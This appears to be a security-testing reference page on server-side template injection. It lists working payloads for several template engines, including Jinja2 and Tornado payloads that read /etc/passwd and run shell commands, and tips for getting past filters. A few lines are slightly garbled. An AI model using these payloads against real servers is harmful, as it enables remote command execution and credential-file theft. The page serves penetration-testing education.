Template injection
========================================

Introduction
----------------------------------------
The template engine is used to render content using dynamic data. This context data is usually controlled by the user and formatted by the template to generate web pages, emails, etc. The template engine allows powerful language expressions to be used in templates to present dynamic content by processing context data using code constructs (such as conditional statements, loops, etc.). If an attacker has control over the template to be rendered, they will be able to inject expressions that expose context data, or even run arbitrary commands on the server.

Test Method
----------------------------------------
- Determine the engine used
- View engine-related documentation to determine its security mechanism and its own functions and variables
- Need to find the attack surface and try to attack

Test cases
----------------------------------------
- Simple mathematical expression, ``{{ 7+7 }} => 14``
- String expression ``{{ "ajin" }} => ajin``
- Ruby
- ``<%= 7 * 7 %>``
- ``<%= File.open('/etc/passwd').read %>``
- Java
- ``${7*7}``
- Twig
- ``{{7*7}}``
- Smarty
- ``{php}echo `id`;{/php}``
- AngularJS
- ``$eval('1+1')``
- Tornado
- Reference module ``{% import module %}``
- => ``{% import os %}{{ os.popen("whoami").read() }}``
- Flask/Jinja2
- ``{{ config }}``
- ``{{ config.items() }}``
- ``{{get_flashed_messages.__globals__['current_app'].config}}``
- ``{{''.__class__.__mro__[-1].__subclasses__()}}``
- ``{{ url_for.__globals__['__builtins__'].__import__('os').system('ls') }}``
- ``{{ request.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}``
- Django
- ``{{ request }}``
- ``{% debug %}``
- ``{% load module %}``
- ``{% include "x.html" %}``
- ``{% extends "x.html" %}``

Target
----------------------------------------
- Create an object
- File reading and writing
- Remote file contains
- Information leakage
- Elevation of Rights

Related attributes
----------------------------------------

``__class__``
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
New classes in python (i.e. classes that display inheriting object objects) have a property ``__class__`` used to get the corresponding class of the current instance, such as ``"".__class__`` to get the corresponding class of the string instance. kind

``__mro__``
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
The ``__mro__`` property of a class object in python will return a tuple object, which contains all the inherited base classes of the current class object. The order of elements in the tuple is the order found by MRO (Method Resolution Order).

``__globals__``
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
All global variables of the function are saved. In use, you can use ``__init__`` to get the object's function and obtain the ``file```````, etc. modules such as ```` to proceed to the next step. use

``__subclasses__()``
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Python's new class retains references to all its subclasses. The ``__subclasses__()` method returns references to all the living subclasses of the class (a class object reference, not an instance).

Because all classes in python inherit object, you can get the object of the desired class by calling the ``__subclasses__()`` method of the object class object.

Common Payloads
----------------------------------------
- ``().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()``
- ``().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls /").read()' )``

Bypassing Tips
----------------------------------------

String stitching
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
``request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]``

Bypass using parameters
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::

params = {
'clas': '__class__',
'mr': '__mro__',
'subc': '__subclasses__'
}
data = {
"data": "{{''[request.args.clas][request.args.mr][1][request.args.subc]()}}"
}
r = requests.post(url, params=params, data=data)
print(r.text)

Reference link
----------------------------------------
- `Server-side template injection <https://zhuanlan.zhihu.com/p/28823933>`_
- `Execute arbitrary code with Python features <http://blog.knownsec.com/2016/02/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/>`_
